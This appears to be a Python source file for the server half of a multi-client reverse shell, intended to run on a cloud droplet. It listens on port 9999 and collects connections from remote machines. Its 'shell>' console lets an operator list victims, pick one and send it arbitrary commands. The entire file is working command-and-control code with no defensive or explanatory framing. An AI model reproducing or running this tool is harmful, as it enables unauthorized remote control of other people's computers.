#this file will go to server (Our created droplet on DigitalOcean)
import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
NUMBER_OF_JOBS = [1, 2]
all_connections = []
all_addresses = []


def create_socket():
    try:
        global host
        global port 
        global s
        
        #Here host = "" means it will automatically get its own ip
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket connection error : " + msg)

def bind_socket():
    try:
        global host
        global port 
        global s

        print("Binding the port " + str(port))

        s.bind((host, port))
        s.listen(5)
    
    except socket.error as msg:
        print("Socket binding error " + msg)
        bind_socket()

# def socket_accept():
#     conn, address = s.accept()
#     print("Connection has established | IP " + address[0] + "| PORT " + str(address[1]))
#     send_commands(conn)
#     conn.close()

# def send_commands(conn):
#     while True:
#         cmd = input()
#         if cmd == 'quit':
#             conn.close()
#             s.close()
#             sys.exit()
#         if len(str.encode(cmd)) > 0:
#             conn.send(str.encode(cmd))
#             client_response = str(conn.recv(1024), 'utf-8')
#             print(client_response, end='')

def accepting_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)
            print("Connection has been Established IP:{}".format(address[0]))
            all_connections.append(conn)
            all_addresses.append(address)

        
        except:
            print('Error Accepting connections')
    
def start_shell():
    while True:
        cmd = input("shell> ")
        if cmd == 'list':
            list_connections()

        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
            
        else:
            print("Invalid command")


def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        
        results += str(i) + "    " + all_addresses[i][0] + "    " + all_addresses[i][1] + '\n'
    print(results)
    
def get_target(cmd):
    try:
        target = int(cmd.replace('select ', ''))
        conn = all_connections[target]
        print(f'connected to {all_addresses[target][0]}')
        print(str(all_addresses[target][0]) + "> ", end='')
        return conn
    except:
        print("Invalid selection")
        return None

def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            
            if cmd == 'quit':
                break
            if len(cmd.encode()) > 0:
                conn.send(cmd.encode())
                client_response = str(conn.recv(20480), 'utf-8')
                print(client_response, end='')
        except:
            print("Error sending command")
            break


def main():
    create_socket()
    bind_socket()
    # socket_accept()
    accepting_connections()

main()